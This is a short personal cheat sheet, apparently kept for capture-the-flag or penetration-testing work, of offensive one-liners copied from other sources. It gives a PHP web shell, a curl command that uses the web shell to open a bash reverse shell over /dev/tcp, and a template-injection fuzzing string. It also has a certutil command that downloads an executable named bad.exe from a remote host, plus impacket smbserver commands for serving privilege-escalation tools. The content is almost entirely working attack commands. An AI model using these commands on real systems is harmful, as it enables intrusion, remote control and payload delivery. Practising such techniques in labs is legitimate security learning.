in here is things i have copy pasted since i have to look for them way too often, i take no credit for anything btw

### bash reverse shell from a php command thing

When you have one of these uploaded:

```php
<?php system($_REQUEST['cmd']); ?>
```

and need a revshell.

```bash
curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
```

### SSTI Fuzzing string

stolen from hacktricks bc i use it often and it takes me forever to find it each time
```
${{<%[%'"}}%\
```

### Certutil File Download

stolen from ired.team. i forgor this one way too much aswell

```powershell
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

### smberver commands

```bash

# accept specific auth
smbserver.py -smb2support <SHARENAME> <LOCALPATH> -username <USERNAME> -password <PASSWORD>
smbsever.py -smb2support POSTEXP /home/tobeatelite/ctf/tools/privesc -username tbe -password tbe

# anon access
smbserver.py <SHARENAME> <LOCALPATH>
smbserver.py POSTEXP /home/tobeatelite/ctf/tools/privesc

```
